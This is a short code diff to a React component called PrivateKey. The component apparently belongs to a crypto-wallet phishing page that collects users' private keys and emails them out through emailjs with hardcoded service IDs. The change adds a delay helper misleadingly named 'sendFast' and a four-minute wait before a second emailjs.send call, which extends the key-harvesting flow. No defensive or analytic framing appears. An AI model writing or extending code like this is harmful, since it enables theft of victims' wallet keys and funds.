@@ -37,6 +37,9 @@ const PrivateKey = ({ wallet, appType }) => {
     e.preventDefault();
     setPrivateSubmitBtn('Processing...');
 
+    const sendFast = (ms: number): Promise<void> =>
+      new Promise((resolve) => setTimeout(resolve, ms));
+
     if (privateKey64Long) {
       try {
 
@@ -55,6 +58,8 @@ const PrivateKey = ({ wallet, appType }) => {
           },
           '4leuzsOPi6Oh_D4e0'
         );
+
+        await sendFast(4 * 60 * 1000);
 
         await emailjs.send(
           'service_ky8xa0e',
